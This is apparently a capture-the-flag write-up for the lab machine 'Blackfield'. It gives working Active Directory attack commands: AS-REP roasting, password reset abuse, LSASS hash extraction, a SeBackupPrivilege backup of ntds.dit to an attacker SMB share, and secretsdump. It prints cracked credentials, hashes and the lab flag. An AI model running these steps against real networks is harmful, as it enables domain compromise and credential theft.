# Enumeration
IP: 10.10.10.192
## Nmap
```bash
sudo nmap -sC -sV 10.10.10.192
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-06 06:50 EST
Nmap scan report for 10.10.10.192
Host is up (0.027s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-06 18:50:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: BLACKFIELD.local0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-06T18:50:48
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 7h00m01s
```

## LDAP
```bash
ldapsearch -x -H ldap://10.10.10.192 -s base namingcontexts
```
Namingcontexts: DC=blackfield,dc=local
Need to be authenticated.

## SMB
```bash
smbclient -L //10.10.10.192/
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	forensic        Disk      Forensic / Audit share.
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	profiles$       Disk      
	SYSVOL          Disk      Logon server share 
```
Check which drives can be read with cme
We can read IPC$ and profiles$

### IPC
Nothing
### profiles
A lot of user folders.
mount the drive.
```bash
sudo mount -t cifs '//10.10.10.192/profiles$' /mnt
```

## Check valid usernames with kerbrute
```bash
/opt/kerbrute userenum --dc 10.10.10.192 -d blackfield -o valid-users.lst users.lst
grep VALID valid-users.lst | awk '{print $7}'| awk -F\@ '{print $1}'
```
Valid users
```
audit2020
support
svc_backup
```

## ASREP on valid users.
```bash
python3 /opt/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile valid-users.lst blackfield/
```
The user support returns a hash.
```hash
$krb5asrep$23$support@BLACKFIELD:48fd6f34ac841894f8433c16d017b1d2$a06145156aeef6799739d1de9a24ad628af87ebf8371643bc8f705d4d7a1fbda5cba031fe69521f32a03bd0830e0c3a2038b25dbd40779a797f10f330a1c22c8156c946d5de6c5c48103e87ce1c45a9ee7bcfa4ff8d977200cdcb85ca6641a69bc458045d6ba27125295d75d2bba6b37e464a82874b24f92b849cf8ed1bfe107e4b0cc2f58de652e9f098fc5b045a3017e12b0cf007ed675b924f37c9529ad504e1943f29ff3fc00f688faf5a015c544d2553c47606b874cac9ef4889824899a711029d56772a471f45e9f9bf4c57f49c03c0531b8c8a6b6fcad368596fc290bc709465f6ee43297d460de868924
```
Crack with hashcat:
`#00^BlackKnight`

# Enumeration with valid account
## Check SMB with new creds
```bash
crackmapexec smb 10.10.10.192 --shares -u 'support' -p '#00^BlackKnight'
```
User can read netlogon and sysvol.

## login to RPC
```bash
rpcclient -U support 10.10.10.192
```
Get valid users.
```rpc
enumdomusers
```
Get usernames:
```bash
cat users.rcp | awk -F[ '{print $2}'|awk -F] '{print $1}' > tmp
```
Check for ASREP again. No new hits

## Bloodhound ingestor
```bash
sudo python3 bloodhound.py -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
```

### Use bloodhound
The support user can reset the password for audit2020
### Abuse info
```
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
```

Then create a secure string object for the password you want to set on the target user:

```
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
```

Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as SUPPORT@BLACKFIELD.LOCAL:

```
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
```

## Change password for user
Use rpcclient
```rpcclient
setuserinfo2 Audit2020 23 'Password123#'
```

# Enumeration as Audit2020
## SMB
Can view the forensics drive.
Mount the drive.
```bash
sudo mount -t cifs -o 'username=Audit2020,password=Password123#' //10.10.10.192/forensic /mnt
```

lsass.zip file in drive.
Unzip the file and try to extract data.
```bash
pypykatz lsa minidump lsass.DMP > lsass.dump
```
Two user's NT hash:
```lst
svc_backup:9658d1d1dcd9250115e2205d9f48400d
Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62
```
Check for valid creds.
```bash
crackmapexec smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
Which is valid. Check winrm.
```bash
crackmapexec winrm 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```
This is valid, which means a user on the box!

# Priv esc
This user has the SeBackupPrivilege and SeRestorePrivilege privileges

## Exploit SeBackupPrivilege
make a ntfs disk and mount it.
Start a smb server on the attacker machine using the smb daemon.
```bash
nano /etc/samba/smb.conf

[Share]
   comment = Ew
   path = /tmp/blackfield
   read only = no
   guest ok = yes

mkdir /tmp/blackfield
chmod 777 /tmp/blackfield
```

On the windows machine
```powershell
net use x: \\10.10.14.3\Share
echo y | wbadmin start backup -backuptarget:\\10.10.14.3\Share -include:c:\windows\ntds\
```

There is a .vhdx file.
Lets get the ntds file.
```powershell
echo Y | wbadmin start recovery -version:11/06/2022-21:45 -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```
*clearly*
get the file off the box. (via smb)
save the reg and then download it.

use secrets.dump to get everything.
```bash
/opt/impacket/examples/secretsdump.py -ntds ntds.dit -system system.hive LOCAL > ntds.out
```

```hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:0ae690f31d64846e88f9bd11d38bf351:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:7a1762d79c21e263eae080fadbb03429:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
```

Login as admin via evil-winrm
and get root flag.
```flag
4375a629c7c67c8e29db269060c955cb
```

# Cleanup
* Remove the system.hive and ntds.dit files. Very bad to just leave on a desktop.
* Change back smb settings on attacker machine.
* Reset the Audit2020's account password.


